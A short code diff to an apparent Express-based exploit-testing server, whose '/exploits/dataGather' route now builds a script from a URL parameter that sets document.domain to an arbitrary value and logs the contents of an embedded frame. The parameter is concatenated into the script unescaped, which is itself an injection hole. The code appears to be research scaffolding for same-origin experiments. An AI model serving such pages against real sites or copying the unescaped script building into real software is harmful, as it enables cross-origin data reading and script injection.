@@ -12,6 +12,12 @@ let htmlBuildingBlocks = {
 	scriptClose: "</script>",
 	alertBox: function(msg){
 		return "alert('"+msg+"');";
+	},
+	domainChange: function(domain){
+		return "document.domain='"+domain+"';";
+	},
+	consoleLog: function(what){
+		return "console.log("+what+");";
 	}
 }
 
@@ -80,12 +86,16 @@ app.get('/exploits/css/:file', function(req,res){
 
 
 
-app.get('/exploits/dataGather', function(req,res){
+app.get('/exploits/dataGather/:domain', function(req,res){
 	'use strict';
 
 	let page = "";
 
-	page = "<script type='text/javascript'>document.domain = 'localhost';console.log(window.frames[0])</script>";
+	//page = "<script type='text/javascript'>document.domain = '"+req.params.domain+"';console.log(window.frames[0])</script>";
+	page = 	htmlBuildingBlocks.scriptOpen+
+			htmlBuildingBlocks.domainChange(req.params.domain)+
+			htmlBuildingBlocks.consoleLog("window.frames[0]")+
+			htmlBuildingBlocks.scriptClose;
 
 	res.send(page);
 });
